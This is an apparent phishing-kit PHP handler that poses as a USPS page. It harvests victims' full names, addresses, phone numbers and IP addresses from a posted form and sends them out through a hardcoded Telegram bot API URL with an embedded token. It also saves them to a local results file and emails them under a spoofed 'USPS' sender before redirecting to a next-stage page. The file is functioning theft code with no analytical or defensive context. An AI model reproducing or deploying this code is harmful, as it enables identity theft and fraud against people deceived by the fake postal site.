<?php
include "anti/index.php";
include "mailto.php";
include "id.php";

$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('log.txt', $line . PHP_EOL, FILE_APPEND);
if(isset($_POST['login'])){
$ip = getenv("REMOTE_ADDR");
$message = "-------------------- <3 USPS <3-------------------\nFull Name : ".$_POST['fullname']."\nAddress 1 : ".$_POST['add1']."\nAddress 2 : ".$_POST['add2']."\nCity      : ".$_POST['city']."\nstate  : ".$_POST['sstate']."\nzip Code  : ".$_POST['zipp']."\nPhone num  : ".$_POST['phonee']."\nIP      : ".$ip."\n-------------------- <3 USPS <3-------------------\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot1834563751:AAHvd5FWcQ_AULvpqA5S3t7I0cnI6b9euwA/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
	$subject="❤ PaLEsTiNi ❤ [".$_POST['fullname']."] From [".$ip."]";
	$headers="From: 📬 USPS 📬 <newlogin@palestini.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	@mail($yours,$subject,$message,$headers);
HEADER("Location: index2.php");
}
?>